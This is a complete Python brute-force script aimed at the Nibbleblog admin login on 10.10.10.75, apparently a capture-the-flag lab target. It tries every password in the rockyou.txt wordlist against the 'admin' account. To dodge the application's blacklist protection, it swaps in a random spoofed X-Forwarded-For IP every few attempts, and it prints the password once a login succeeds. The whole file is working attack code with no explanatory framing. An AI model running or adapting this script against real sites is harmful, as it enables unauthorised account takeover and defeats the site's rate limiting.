#!/usr/bin/python3
from random import randint
import requests

#Bruteforce information
password_file = '/usr/share/wordlists/rockyou.txt'
rate_limit = 5
error_rate_limit = 'Blacklist protection'
error_login = 'Incorrect username or password.'

# Target information
RHOST = '10.10.10.75'
login_page = '/nibbleblog/admin.php'
target_URL = f'http://{RHOST}{login_page}'
username = 'admin'


def attempt_login(password: str, ip: str) -> bool:
  
    headers = {'X-Forwarded-For': ip}
    payload = { 'username': username, 
                'password': password}
                
    r = requests.post(target_URL, headers=headers, data=payload)

    if r.status_code == 500:
        print("Internal server error, aborting!")
        exit(1)

    if error_rate_limit in r.text:
        print("Rate limit hit, aborting!")
        exit(1)

    return error_login not in r.text


def random_ip() -> str:
   
    return ".".join(str(randint(0, 255)) for i in range(4))


def bruteforce(start_at: int = 1):
    
    ip: str = random_ip()
    num_attempts: int = 1

    for password in open(password_file):
        if num_attempts < start_at:
            num_attempts += 1
            continue

        if num_attempts % (rate_limit - 1) == 0:
            ip = random_ip()

        password = password.strip()
        print(f"Attempt {num_attempts}: {ip}\t\t{password}")

        if attempt_login(password, ip):
            print(f"Password for {username} is {password}")
            break

        num_attempts += 1


if __name__ == '__main__':
    bruteforce()

